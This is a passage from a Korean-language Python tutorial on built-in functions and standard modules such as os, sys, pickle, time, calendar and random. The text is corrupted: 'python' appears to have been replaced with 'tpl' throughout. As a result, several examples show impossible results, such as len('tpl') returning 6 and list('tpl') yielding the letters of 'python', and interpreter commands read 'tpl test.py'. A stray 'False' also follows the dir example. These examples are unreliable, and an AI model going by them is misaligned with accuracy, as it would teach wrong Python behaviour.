있다.\n\u0026gt;\u0026gt;\u0026gt; all([1, 2, 3])\rTrue\r\u0026gt;\u0026gt;\u0026gt; all([1, 2, 3, 0])\rFalse\r  any any(x)는 x 중 하나라도 참이 있으면 True를 돌려주고, x가 모두 거짓일 때에만 False를 돌려준다. all(x)의 반대이다.\n다음 예를 보자.\n\u0026gt;\u0026gt;\u0026gt; any([1, 2, 3, 0])\rTrue\r\u0026gt;\u0026gt;\u0026gt; any([0, \u0026#34;\u0026#34;])\rFalse\r  chr chr(i)는 아스키(ASCII) 코드 값을 입력받아 그 코드에 해당하는 문자를 출력하는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; chr(97)\r\u0026#39;a\u0026#39;\r\u0026gt;\u0026gt;\u0026gt; chr(48)\r\u0026#39;0\u0026#39;\r  dir dir은 객체가 자체적으로 가지고 있는 변수나 함수를 보여 준다. 다음 예는 리스트와 딕셔너리 객체 관련 함수(메서드)를 보여 주는 예이다. 우리가 02장에서 살펴본 자료형 관련 함수를 만나 볼 수 있다.\n\u0026gt;\u0026gt;\u0026gt; dir([1, 2, 3])\r[\u0026#39;append\u0026#39;, \u0026#39;count\u0026#39;, \u0026#39;extend\u0026#39;, \u0026#39;index\u0026#39;, \u0026#39;insert\u0026#39;, \u0026#39;pop\u0026#39;,...]\r\u0026gt;\u0026gt;\u0026gt; dir({\u0026#39;1\u0026#39;:\u0026#39;a\u0026#39;})\r[\u0026#39;clear\u0026#39;, \u0026#39;copy\u0026#39;, \u0026#39;get\u0026#39;, \u0026#39;has_key\u0026#39;, \u0026#39;items\u0026#39;, \u0026#39;keys\u0026#39;,...]\rFalse\r  divmod divmod(a, b)는 2개의 숫자를 입력으로 받는다. 그리고 a를 b로 나눈 몫과 나머지를 튜플 형태로 돌려주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; divmod(7, 3)\r(2, 1)\r  enumerate enumerate는 \u0026ldquo;열거하다\u0026quot;라는 뜻이다. 이 함수는 순서가 있는 자료형(리스트, 튜플, 문자열)을 입력으로 받아 인덱스 값을 포함하는 enumerate 객체를 반환한다.\nfor i, name in enumerate([\u0026#39;body\u0026#39;, \u0026#39;foo\u0026#39;, \u0026#39;bar\u0026#39;]):\rprint(i, name)\r0 body\r1 foo\r2 bar\r  eval eval(expression )은 실행 가능한 문자열(1+2, \u0026lsquo;hi\u0026rsquo; + \u0026lsquo;a\u0026rsquo; 같은 것)을 입력으로 받아 문자열을 실행한 결괏값을 돌려주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; eval(\u0026#39;1+2\u0026#39;)\r3\r\u0026gt;\u0026gt;\u0026gt; eval(\u0026#34;\u0026#39;hi\u0026#39; + \u0026#39;a\u0026#39;\u0026#34;)\r\u0026#39;hia\u0026#39;\r\u0026gt;\u0026gt;\u0026gt; eval(\u0026#39;divmod(4, 3)\u0026#39;)\r(1, 1)\r  filter filter란 무엇인가를 걸러낸다는 뜻으로 filter 함수도 동일한 의미를 가진다.\nfilter 함수는 첫 번째 인수로 함수 이름을, 두 번째 인수로 그 함수에 차례로 들어갈 반복 가능한 자료형을 받는다. 그리고 두 번째 인수인 반복 가능한 자료형 요소가 첫 번째 인수인 함수에 입력되었을 때 반환 값이 참인 것만 묶어서(걸러 내서) 돌려준다.\ndef positive(Ex): result = [] for i in Ex: if i \u0026gt; 0: result.append(i) return result\rprint(positive([1,-3,2,0,-5,6]))\r[1, 2, 6]\rprint(list(filter(positive, [1, -3, 2, 0, -5, 6])))\r[1, 2, 6]\r  hex hex(x)는 정수 값을 입력받아 16진수(hexadecimal)로 변환하여 돌려주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; hex(234)\r\u0026#39;0xea\u0026#39;\r\u0026gt;\u0026gt;\u0026gt; hex(3)\r\u0026#39;0x3\u0026#39;\r  id id(object)는 객체를 입력받아 객체의 고유 주소 값(레퍼런스)을 돌려주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; a = 3\r\u0026gt;\u0026gt;\u0026gt; id(3)\r135072304\r  input input([prompt])은 사용자 입력을 받는 함수이다. 매개변수로 문자열을 주면 다음 세 번째 예에서 볼 수 있듯이 그 문자열은 프롬프트가 된다.\n\u0026gt;\u0026gt;\u0026gt; a = input()\rhi\r\u0026gt;\u0026gt;\u0026gt; a\r\u0026#39;hi\u0026#39;\r  int int(x)는 문자열 형태의 숫자나 소수점이 있는 숫자 등을 정수 형태로 돌려주는 함수로, 정수를 입력으로 받으면 그대로 돌려준다. int(x, radix)는 radix 진수로 표현된 문자열 x를 10진수로 변환하여 돌려준다.\n\u0026gt;\u0026gt;\u0026gt; int(\u0026#39;3\u0026#39;)\r3\r\u0026gt;\u0026gt;\u0026gt; int(3.4)\r3\r# 2진수로 표현된 11의 10진수 값은 다음과 같이 구한다.\r\u0026gt;\u0026gt;\u0026gt; int(\u0026#39;11\u0026#39;, 2)\r3\r# 16진수로 표현된 1A의 10진수 값은 다음과 같이 구한다.\r\u0026gt;\u0026gt;\u0026gt; int(\u0026#39;1A\u0026#39;, 16)\r26\r  isinstance isinstance(object, class )는 첫 번째 인수로 인스턴스, 두 번째 인수로 클래스 이름을 받는다. 입력으로 받은 인스턴스가 그 클래스의 인스턴스인지를 판단하여 참이면 True, 거짓이면 False를 돌려준다.\n\u0026gt;\u0026gt;\u0026gt; class Person: pass\r...\r\u0026gt;\u0026gt;\u0026gt; a = Person()\r\u0026gt;\u0026gt;\u0026gt; isinstance(a, Person)\rTrue\r# 위 예는 a가 Person 클래스가 만든 인스턴스임을 확인시켜 준다.\r\u0026gt;\u0026gt;\u0026gt; b = 3\r\u0026gt;\u0026gt;\u0026gt; isinstance(b, Person)\rFalse\r# b는 Person 클래스가 만든 인스턴스가 아니므로 False를 돌려준다.\r  len len(s)은 입력값 s의 길이(요소의 전체 개수)를 돌려주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; len(\u0026#34;tpl\u0026#34;)\r6\r\u0026gt;\u0026gt;\u0026gt; len([1,2,3])\r3\r\u0026gt;\u0026gt;\u0026gt; len((1, \u0026#39;a\u0026#39;))\r2\r***\r  list list(s)는 반복 가능한 자료형 s를 입력받아 리스트로 만들어 돌려주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; list(\u0026#34;tpl\u0026#34;)\r[\u0026#39;p\u0026#39;, \u0026#39;y\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;n\u0026#39;]\r\u0026gt;\u0026gt;\u0026gt; list((1,2,3))\r[1, 2, 3]\r# list 함수에 리스트를 입력으로 주면 똑같은 리스트를 복사하여 돌려준다.\r\u0026gt;\u0026gt;\u0026gt; a = [1, 2, 3]\r\u0026gt;\u0026gt;\u0026gt; b = list(a)\r\u0026gt;\u0026gt;\u0026gt; b\r[1, 2, 3]\r  map map(f, iterable)은 함수(f)와 반복 가능한(iterable) 자료형을 입력으로 받는다. map은 입력받은 자료형의 각 요소를 함수 f가 수행한 결과를 묶어서 돌려주는 함수이다.\n# two_times.py\rdef two_times(numberList):\rresult = [ ]\rfor number in numberList:\rresult.append(number*2)\rreturn result\rresult = two_times([1, 2, 3, 4])\rprint(result)\r# two_times 함수는 리스트 요소를 입력받아 각 요소에 2를 곱한 결괏값을 돌려준다. 실행 결과는 다음과 같다.\r[2, 4, 6, 8]\r# 위 예제는 map 함수를 사용하면 다음처럼 바꿀 수 있다.\r\u0026gt;\u0026gt;\u0026gt; def two_times(x): ... return x*2\r...\r\u0026gt;\u0026gt;\u0026gt; list(map(two_times, [1, 2, 3, 4]))\r[2, 4, 6, 8]\r# 이제 앞 예제를 해석해 보자. 먼저 리스트의 첫 번째 요소인 1이 two_times 함수의 입력값으로 들어가고 1 * 2의 과정을 거쳐서 2가 된다. 다음으로 리스트의 두 번째 요소인 2가 2 * 2 의 과정을 거쳐 4가 된다. 따라서 결괏값 리스트는 이제 [2, 4]가 된다. 총 4개의 요솟값이 모두 수행되면 마지막으로 [2, 4, 6, 8]을 돌려준다. 이것이 map 함수가 하는 일이다.\r# 앞의 예는 lambda를 사용하면 다음처럼 간략하게 만들 수 있다.\r\u0026gt;\u0026gt;\u0026gt; list(map(lambda a: a*2, [1, 2, 3, 4]))\r[2, 4, 6, 8]\r  max max(iterable)는 인수로 반복 가능한 자료형을 입력받아 그 최댓값을 돌려주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; max([1, 2, 3])\r3\r\u0026gt;\u0026gt;\u0026gt; max(\u0026#34;tpl\u0026#34;)\r\u0026#39;y\u0026#39;\r  min min(iterable)은 max 함수와 반대로, 인수로 반복 가능한 자료형을 입력받아 그 최솟값을 돌려주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; min([1, 2, 3])\r1\r\u0026gt;\u0026gt;\u0026gt; min(\u0026#34;tpl\u0026#34;)\r\u0026#39;h\u0026#39;\r  oct oct(x)는 정수 형태의 숫자를 8진수 문자열로 바꾸어 돌려주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; oct(34)\r\u0026#39;0o42\u0026#39;\r\u0026gt;\u0026gt;\u0026gt; oct(12345)\r\u0026#39;0o30071\u0026#39;\r  open open(filename, [mode])은 \u0026ldquo;파일 이름\u0026quot;과 \u0026ldquo;읽기 방법\u0026quot;을 입력받아 파일 객체를 돌려주는 함수이다. 읽기 방법(mode)을 생략하면 기본값인 읽기 전용 모드(r)로 파일 객체를 만들어 돌려준다.\nmode\t설명 w\t쓰기 모드로 파일 열기 r\t읽기 모드로 파일 열기 a\t추가 모드로 파일 열기 b\t바이너리 모드로 파일 열기 b는 w, r, a와 함께 사용한다.\n\u0026gt;\u0026gt;\u0026gt; f = open(\u0026#34;binary_file\u0026#34;, \u0026#34;rb\u0026#34;)\r# 위 예의 rb는 \u0026#34;바이너리 읽기 모드\u0026#34;를 의미한다.\r# 다음 예의 fread와 fread2는 동일한 방법이다.\r\u0026gt;\u0026gt;\u0026gt; fread = open(\u0026#34;read_mode.txt\u0026#34;, \u0026#39;r\u0026#39;)\r\u0026gt;\u0026gt;\u0026gt; fread2 = open(\u0026#34;read_mode.txt\u0026#34;)\r# 즉 모드 부분을 생략하면 기본값으로 읽기 모드 r를 갖게 된다.\r# 다음은 추가 모드(a)로 파일을 여는 예이다.\r\u0026gt;\u0026gt;\u0026gt; fappend = open(\u0026#34;append_mode.txt\u0026#34;, \u0026#39;a\u0026#39;)\r  ord ord(c)는 문자의 아스키 코드 값을 돌려주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; ord(\u0026#39;a\u0026#39;)\r97\r\u0026gt;\u0026gt;\u0026gt; ord(\u0026#39;0\u0026#39;)\r48\r  pow pow(x, y)는 x의 y 제곱한 결괏값을 돌려주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; pow(2, 4)\r16\r\u0026gt;\u0026gt;\u0026gt; pow(3, 3)\r27\r  range range([start,] stop [,step] )는 for문과 함께 자주 사용하는 함수이다. 이 함수는 입력받은 숫자에 해당하는 범위 값을 반복 가능한 객체로 만들어 돌려준다.\n# 시작 숫자를 지정해 주지 않으면 range 함수는 0부터 시작한다.\r\u0026gt;\u0026gt;\u0026gt; list(range(5))\r[0, 1, 2, 3, 4]\r# 입력으로 주어지는 2개의 인수는 시작 숫자와 끝 숫자를 나타낸다. 단 끝 숫자는 해당 범위에 포함되지 않는다는 것에 주의하자.\r\u0026gt;\u0026gt;\u0026gt; list(range(5, 10))\r[5, 6, 7, 8, 9]\r# 세 번째 인수는 숫자 사이의 거리를 말한다.\r\u0026gt;\u0026gt;\u0026gt; list(range(1, 10, 2))\r[1, 3, 5, 7, 9]\r\u0026gt;\u0026gt;\u0026gt; list(range(0, -10, -1))\r[0, -1, -2, -3, -4, -5, -6, -7, -8, -9]\r  round round(number[, ndigits]) 함수는 숫자를 입력받아 반올림해 주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; round(4.6)\r5\r\u0026gt;\u0026gt;\u0026gt; round(4.2)\r4\r\u0026gt;\u0026gt;\u0026gt; round(5.678, 2)\r5.68\r# round 함수의 두 번째 매개변수는 반올림하여 표시하고 싶은 소수점의 자릿수(ndigits)이다.\r  sorted sorted(iterable) 함수는 입력값을 정렬한 후 그 결과를 리스트로 돌려주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; sorted([3, 1, 2])\r[1, 2, 3]\r\u0026gt;\u0026gt;\u0026gt; sorted([\u0026#39;a\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;b\u0026#39;])\r[\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;]\r\u0026gt;\u0026gt;\u0026gt; sorted(\u0026#34;zero\u0026#34;)\r[\u0026#39;e\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;z\u0026#39;]\r\u0026gt;\u0026gt;\u0026gt; sorted((3, 2, 1))\r[1, 2, 3]\r# 리스트 자료형에도 sort 함수가 있다. 하지만 리스트 자료형의 sort 함수는 리스트 객체 그 자체를 정렬만 할 뿐 정렬된 결과를 돌려주지는 않는다.\r  str str(object)은 문자열 형태로 객체를 변환하여 돌려주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; str(3)\r\u0026#39;3\u0026#39;\r\u0026gt;\u0026gt;\u0026gt; str(\u0026#39;hi\u0026#39;)\r\u0026#39;hi\u0026#39;\r\u0026gt;\u0026gt;\u0026gt; str(\u0026#39;hi\u0026#39;.upper())\r\u0026#39;HI\u0026#39;\r  sum sum(iterable) 은 입력받은 리스트나 튜플의 모든 요소의 합을 돌려주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; sum([1,2,3])\r6\r\u0026gt;\u0026gt;\u0026gt; sum((4,5,6))\r15\r  tuple tuple(iterable)은 반복 가능한 자료형을 입력받아 튜플 형태로 바꾸어 돌려주는 함수이다. 만약 튜플이 입력으로 들어오면 그대로 돌려준다.\n\u0026gt;\u0026gt;\u0026gt; tuple(\u0026#34;abc\u0026#34;)\r(\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;)\r\u0026gt;\u0026gt;\u0026gt; tuple([1, 2, 3])\r(1, 2, 3)\r\u0026gt;\u0026gt;\u0026gt; tuple((1, 2, 3))\r(1, 2, 3)\r  type type(object)은 입력값의 자료형이 무엇인지 알려 주는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; type(\u0026#34;abc\u0026#34;)\r\u0026lt;class \u0026#39;str\u0026#39;\u0026gt;\r\u0026gt;\u0026gt;\u0026gt; type([ ])\r\u0026lt;class \u0026#39;list\u0026#39;\u0026gt;\r\u0026gt;\u0026gt;\u0026gt; type(open(\u0026#34;test\u0026#34;, \u0026#39;w\u0026#39;))\r\u0026lt;class \u0026#39;_io.TextIOWrapper\u0026#39;\u0026gt;\r  zip zip(*iterable)은 동일한 개수로 이루어진 자료형을 묶어 주는 역할을 하는 함수이다.\n\u0026gt;\u0026gt;\u0026gt; list(zip([1, 2, 3], [4, 5, 6]))\r[(1, 4), (2, 5), (3, 6)]\r\u0026gt;\u0026gt;\u0026gt; list(zip([1, 2, 3], [4, 5, 6], [7, 8, 9]))\r[(1, 4, 7), (2, 5, 8), (3, 6, 9)]\r\u0026gt;\u0026gt;\u0026gt; list(zip(\u0026#34;abc\u0026#34;, \u0026#34;def\u0026#34;))\r[(\u0026#39;a\u0026#39;, \u0026#39;d\u0026#39;), (\u0026#39;b\u0026#39;, \u0026#39;e\u0026#39;), (\u0026#39;c\u0026#39;, \u0026#39;f\u0026#39;)]\r  sys sys 모듈은 파이썬 인터프리터가 제공하는 변수와 함수를 직접 제어할 수 있게 해주는 모듈이다.\n명령 행에서 인수 전달하기 - sys.argv\nC:/User/home\u0026gt;tpl test.py abc pey guido\r# 명령 프롬프트 창에서 위 예처럼 test.py 뒤에 또 다른 값을 함께 넣어 주면 sys.argv 리스트에 그 값이 추가된다.\r예제를 따라 하며 확인해 보자. 우선 다음과 같은 파이썬 프로그램을 작성하자. argv_test.py 파일은 C:/doit/Mymod 디렉터리에 저장했다고 가정한다(만약 C:/doit/Mymod 디렉터리가 없다면 먼저 생성하고 진행하자).\nargv_test.py import sys\rprint(sys.argv)\r명령 프롬프트 창에서 Mymod 디렉터리로 들어간 뒤 다음과 같이 실행해 보자.\rC:/doit/Mymod\u0026gt;tpl argv_test.py you need tpl\r[\u0026#39;argv_test.py\u0026#39;, \u0026#39;you\u0026#39;, \u0026#39;need\u0026#39;, \u0026#39;tpl\u0026#39;]\rtpl 명령어 뒤의 모든 것들이 공백을 기준으로 나뉘어서 sys.argv 리스트의 요소가 된다.\r※ 명령 프롬프트 창에서는 /, \\든 상관없지만, 소스코드 안에서는 반드시 / 또는 \\\\ 기호를 사용해야 한다.\rsys.exit 강제로 스크립트 종료\n\u0026gt;\u0026gt;\u0026gt; sys.exit()\r# sys.exit는 Ctrl+Z나 Ctrl+D를 눌러서 대화형 인터프리터를 종료하는 것과 같은 기능을 한다. 프로그램 파일 안에서 사용하면 프로그램을 중단시킨다.\rsys.path 자신이 만든 모듈 불러와 사용하기 sys.path는 파이썬 모듈들이 저장되어 있는 위치를 나타낸다. 즉 이 위치에 있는 파이썬 모듈은 경로에 상관없이 어디에서나 불러올 수 있다.\n\u0026gt;\u0026gt;\u0026gt; import sys\r\u0026gt;\u0026gt;\u0026gt; sys.path\r[\u0026#39;\u0026#39;, \u0026#39;C:\\\\Windows\\\\SYSTEM32\\\\tpl37.zip\u0026#39;, \u0026#39;c:\\\\tpl37\\\\DLLs\u0026#39;, \u0026#39;c:\\\\tpl37\\\\lib\u0026#39;, \u0026#39;c:\\\\tpl37\u0026#39;, \u0026#39;c:\\\\tpl37\\\\lib\\\\site-packages\u0026#39;]\r\u0026gt;\u0026gt;\u0026gt;\r# \u0026#39;\u0026#39; = 현재 디렉토리\rpath_append.py 파이썬 프로그램 파일에서 sys.path.append를 사용해 경로 이름을 추가할 수 있다. 이렇게 하고 난 후에는 C:/doit/Mymod 디렉터리에 있는 파이썬 모듈을 불러와서 사용할 수 있다.\nimport sys\rsys.path.append(\u0026#34;C:/doit/mymod\u0026#34;)\r  pickle pickle은 객체의 형태를 그대로 유지하면서 파일에 저장하고 불러올 수 있게 하는 모듈이다. 다음 예는 pickle 모듈의 dump 함수를 사용하여 딕셔너리 객체인 data를 그대로 파일에 저장하는 방법을 보여 준다.\n\u0026gt;\u0026gt;\u0026gt; import pickle\r\u0026gt;\u0026gt;\u0026gt; f = open(\u0026#34;test.txt\u0026#34;, \u0026#39;wb\u0026#39;)\r\u0026gt;\u0026gt;\u0026gt; data = {1: \u0026#39;tpl\u0026#39;, 2: \u0026#39;you need\u0026#39;}\r\u0026gt;\u0026gt;\u0026gt; pickle.dump(data, f)\r\u0026gt;\u0026gt;\u0026gt; f.close()\r# 다음은 pickle.dump로 저장한 파일을 pickle.load를 사용해서 원래 있던 딕셔너리 객체(data) 상태 그대로 불러오는 예이다.\r\u0026gt;\u0026gt;\u0026gt; import pickle\r\u0026gt;\u0026gt;\u0026gt; f = open(\u0026#34;test.txt\u0026#34;, \u0026#39;rb\u0026#39;)\r\u0026gt;\u0026gt;\u0026gt; data = pickle.load(f)\r\u0026gt;\u0026gt;\u0026gt; print(data)\r{2:\u0026#39;you need\u0026#39;, 1:\u0026#39;tpl\u0026#39;}\r# 위 예에서는 딕셔너리 객체를 사용했지만 어떤 자료형이든저장하고 불러올 수 있다.\r  os OS 모듈은 환경 변수나 디렉터리, 파일 등의 OS 자원을 제어할 수 있게 해주는 모듈이다.\nos.environ 시스템은 제각기 다른 환경 변수 값을 가지고 있는데, os.environ은 현재 시스템의 환경 변수 값을 보여 준다. 다음을 따라 해 보자.\n\u0026gt;\u0026gt;\u0026gt; import os\r\u0026gt;\u0026gt;\u0026gt; os.environ\renviron({\u0026#39;PROGRAMFILES\u0026#39;: \u0026#39;C:\\\\Program Files\u0026#39;, \u0026#39;APPDATA\u0026#39;: … 생략 …})\r\u0026gt;\u0026gt;\u0026gt;\r# 위 결괏값은 필자의 시스템 정보이다. os.environ은 환경 변수에 대한 정보를 딕셔너리 객체로 돌려준다. 자세히 보면 여러 가지 유용한 정보를 찾을 수 있다.\r# 돌려받은 객체가 딕셔너리이기 때문에 다음과 같이 호출할 수 있다. 다음은 필자 시스템의 PATH 환경 변수 내용이다.\r\u0026gt;\u0026gt;\u0026gt; os.environ[\u0026#39;PATH\u0026#39;]\r\u0026#39;C:\\\\ProgramData\\\\Oracle\\\\Java\\\\javapath;...생략...\u0026#39;\ros.chdir os.chdir를 사용하면 다음과 같이 현재 디렉터리 위치를 변경할 수 있다.\n\u0026gt;\u0026gt;\u0026gt; os.chdir(\u0026#34;C:\\WINDOWS\u0026#34;)\ros.getcwd os.getcwd는 현재 자신의 디렉터리 위치를 돌려준다.\n\u0026gt;\u0026gt;\u0026gt; os.getcwd()\r\u0026#39;C:\\WINDOWS\u0026#39;\ros.system 시스템 자체의 프로그램이나 기타 명령어를 파이썬에서 호출할 수도 있다. os.system(\u0026ldquo;명령어\u0026rdquo;)처럼 사용한다. 다음은 현재 디렉터리에서 시스템 명령어 dir을 실행하는 예이다.\n\u0026gt;\u0026gt;\u0026gt; os.system(\u0026#34;dir\u0026#34;)\r# 실행한 시스템 명령어의 결괏값 돌려받기 - os.popen\ros.popen os.popne은 시스템 명령어를 실행한 결괏값을 읽기 모드 형태의 파일 객체로 돌려준다.\n\u0026gt;\u0026gt;\u0026gt; f = os.popen(\u0026#34;dir\u0026#34;)\r# 읽어 들인 파일 객체의 내용을 보기 위해서는 다음과 같이 하면 된다.\r\u0026gt;\u0026gt;\u0026gt; print(f.read())\r기타 유용한 os 관련 함수 함수\t설명 os.mkdir(디렉터리)\t디렉터리를 생성한다. os.rmdir(디렉터리)\t디렉터리를 삭제한다.단, 디렉터리가 비어있어야 삭제가 가능하다. os.unlink(파일)\t파일을 지운다. os.rename(src, dst)\tsrc라는 이름의 파일을 dst라는 이름으로 바꾼다.\n  shutil shutil은 파일을 복사해 주는 파이썬 모듈이다.\n\u0026gt;\u0026gt;\u0026gt; import shutil\r\u0026gt;\u0026gt;\u0026gt; shutil.copy(\u0026#34;src.txt\u0026#34;, \u0026#34;dst.txt\u0026#34;)\r# 위 예를 실행해 보면 src.txt 파일과 동일한 내용의 파일이 dst.txt로 복사되는 것을 확인할 수 있다.\r  glob 가끔 파일을 읽고 쓰는 기능이 있는 프로그램을 만들다 보면 특정 디렉터리에 있는 파일 이름 모두를 알아야 할 때가 있다. 이럴 때 사용하는 모듈이 바로 glob이다.\n디렉터리에 있는 파일들을 리스트로 만들기 - glob(pathname)\nglob 모듈은 디렉터리 안의 파일들을 읽어서 돌려준다. *, ? 등 메타 문자를 써서 원하는 파일만 읽어 들일 수도 있다.\n다음은 C:/doit 디렉터리에 있는 파일 중 이름이 mark로 시작하는 파일을 모두 찾아서 읽어들이는 예이다.\n\u0026gt;\u0026gt;\u0026gt; import glob\r\u0026gt;\u0026gt;\u0026gt; glob.glob(\u0026#34;c:/doit/mark*\u0026#34;)\r[\u0026#39;c:/doit\\\\marks1.py\u0026#39;, \u0026#39;c:/doit\\\\marks2.py\u0026#39;, \u0026#39;c:/doit\\\\marks3.py\u0026#39;]\r\u0026gt;\u0026gt;\u0026gt;\r  tempfile 파일을 임시로 만들어서 사용할 때 유용한 모듈이 바로 tempfile이다. tempfile.mkstemp()는 중복되지 않는 임시 파일의 이름을 무작위로 만들어서 돌려준다.\n\u0026gt;\u0026gt;\u0026gt; import tempfile\r\u0026gt;\u0026gt;\u0026gt; filename = tempfile.mkstemp()\r\u0026gt;\u0026gt;\u0026gt; filename\r\u0026#39;C:\\WINDOWS\\TEMP\\~-275151-0\u0026#39;\rtempfile.TemporaryFile()은 임시 저장 공간으로 사용할 파일 객체를 돌려준다. 이 파일은 기본적으로 바이너리 쓰기 모드(wb)를 갖는다. f.close()가 호출되면 이 파일 객체는 자동으로 사라진다.\r\u0026gt;\u0026gt;\u0026gt; import tempfile\r\u0026gt;\u0026gt;\u0026gt; f = tempfile.TemporaryFile()\r\u0026gt;\u0026gt;\u0026gt; f.close()\r  time 시간과 관련된 time 모듈에는 함수가 굉장히 많다. 그중 가장 유용한 몇 가지만 알아보자.\ntime.time time.time()은 UTC(Universal Time Coordinated 협정 세계 표준시)를 사용하여 현재 시간을 실수 형태로 돌려주는 함수이다. 1970년 1월 1일 0시 0분 0초를 기준으로 지난 시간을 초 단위로 돌려준다.\n   import time time.time() 988458015.73417199 time.localtime\n   time.localtime은 time.time()이 돌려준 실수 값을 사용해서 연도, 월, 일, 시, 분, 초, \u0026hellip; 의 형태로 바꾸어 주는 함수이다.\n   time.localtime(time.time()) time.struct_time(tm_year=2013, tm_mon=5, tm_mday=21, tm_hour=16, tm_min=48, tm_sec=42, tm_wday=1, tm_yday=141, tm_isdst=0) time.asctime\n   위 time.localtime에 의해서 반환된 튜플 형태의 값을 인수로 받아서 날짜와 시간을 알아보기 쉬운 형태로 돌려주는 함수이다.\n   time.asctime(time.localtime(time.time())) \u0026lsquo;Sat Apr 28 20:50:20 2001\u0026rsquo; time.ctime\n   time.asctime(time.localtime(time.time()))은 time.ctime()을 사용해 간편하게 표시할 수 있다. asctime과 다른 점은 ctime은 항상 현재 시간만을 돌려준다는 점이다.\n   time.ctime() \u0026lsquo;Sat Apr 28 20:56:31 2001\u0026rsquo; time.strftime\n   time.strftime(\u0026lsquo;출력할 형식 포맷 코드\u0026rsquo;, time.localtime(time.time())) strftime 함수는 시간에 관계된 것을 세밀하게 표현하는 여러 가지 포맷 코드를 제공한다.\n시간에 관계된 것을 표현하는 포맷 코드\n포맷코드\t설명\t예 %a\t요일 줄임말\tMon %A\t요일\tMonday %b\t달 줄임말\tJan %B\t달\tJanuary %c\t날짜와 시간을 출력함\t06/01/01 17:22:21 %d\t날(day)\t[01,31] %H\t시간(hour)-24시간 출력 형태\t[00,23] %I\t시간(hour)-12시간 출력 형태\t[01,12] %j\t1년 중 누적 날짜\t[001,366] %m\t달\t[01,12] %M\t분\t[01,59] %p\tAM or PM\tAM %S\t초\t[00,59] %U\t1년 중 누적 주-일요일을 시작으로\t[00,53] %w\t숫자로 된 요일\t[0(일요일),6] %W\t1년 중 누적 주-월요일을 시작으로\t[00,53] %x\t현재 설정된 로케일에 기반한 날짜 출력\t06/01/01 %X\t현재 설정된 로케일에 기반한 시간 출력\t17:22:21 %Y\t년도 출력\t2001 %Z\t시간대 출력\t대한민국 표준시 %%\t문자\t% %y\t세기부분을 제외한 년도 출력\t01 다음은 time.strftime을 사용하는 예이다.\n   import time time.strftime('%x\u0026rsquo;, time.localtime(time.time())) \u0026lsquo;05/01/01\u0026rsquo; time.strftime('%c\u0026rsquo;, time.localtime(time.time())) \u0026lsquo;05/01/01 17:22:21\u0026rsquo; time.sleep\n   time.sleep 함수는 주로 루프 안에서 많이 사용한다. 이 함수를 사용하면 일정한 시간 간격을 두고 루프를 실행할 수 있다. 다음 예를 보자.\n#sleep1.py import time for i in range(10): print(i) time.sleep(1) 위 예는 1초 간격으로 0부터 9까지의 숫자를 출력한다. 위 예에서 볼 수 있듯이 time.sleep 함수의 인수는 실수 형태를 쓸 수 있다. 즉 1이면 1초, 0.5면 0.5초가 되는 것이다.\ncalendar calendar는 파이썬에서 달력을 볼 수 있게 해주는 모듈이다.\ncalendar.calendar(연도)로 사용하면 그해의 전체 달력을 볼 수 있다. 결괏값은 달력이 너무 길어 생략하겠다.\n   import calendar print(calendar.calendar(2015)) calendar.prcal(연도)를 사용해도 위와 똑같은 결괏값을 얻을 수 있다.\n      calendar.prcal(2015) 다음 예는 2015년 12월의 달력만 보여 준다.\n      calendar.prmonth(2015, 12) December 2015 Mo Tu We Th Fr Sa Su 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 calendar.weekday\n   calendar 모듈의 또 다른 유용한 함수를 보자. weekday(연도, 월, 일) 함수는 그 날짜에 해당하는 요일 정보를 돌려준다. 월요일은 0, 화요일은 1, 수요일은 2, 목요일은 3, 금요일은 4, 토요일은 5, 일요일은 6이라는 값을 돌려준다.\n   calendar.weekday(2015, 12, 31) 3 위의 예에서 2015년 12월 31일은 목요일임을 보여 준다.\n   calendar.monthrange\nmonthrange(연도, 월) 함수는 입력받은 달의 1일이 무슨 요일인지와 그 달이 며칠까지 있는지를 튜플 형태로 돌려준다.\n   calendar.monthrange(2015,12) (1, 31) 위 예는 2015년 12월 1일은 화요일이고, 이 달은 31일까지 있다는 것을 보여 준다.\n   날짜와 관련된 프로그래밍을 할 때 위 2가지 함수는 매우 유용하게 사용된다.\n  random random은 난수(규칙이 없는 임의의 수)를 발생시키는 모듈이다. random과 randint에 대해 알아보자.\n다음은 0.0에서 1.0 사이의 실수 중에서 난수 값을 돌려주는 예를 보여 준다.\n   import random random.random() 0.53840103305098674 다음 예는 1에서 10 사이의 정수 중에서 난수 값을 돌려준다.\n      random.randint(1, 10) 6 다음 예는 1에서 55 사이의 정수 중에서 난수 값을 돌려준다.\n      random.randint(1, 55) 43 random 모듈을 사용해서 재미있는 함수를 하나 만들어 보자.\n   random_pop.py import random def random_pop(data): number = random.randint(0, len(data)-1) return data.pop(number)\nif name == \u0026ldquo;main\u0026quot;: data = [1, 2, 3, 4, 5] while data: print(random_pop(data)) 결과값: 2 3 1 5 4 위 random_pop 함수는 리스트의 요소 중에서 무작위로 하나를 선택하여 꺼낸 다음 그 값을 돌려준다. 물론 꺼낸 요소는 pop 메서드에 의해 사라진다.\nrandom_pop 함수는 random 모듈의 choice 함수를 사용하여 다음과 같이 좀 더 직관적으로 만들 수도 있다.\ndef random_pop(data): number = random.choice(data) data.remove(number) return number random.choice 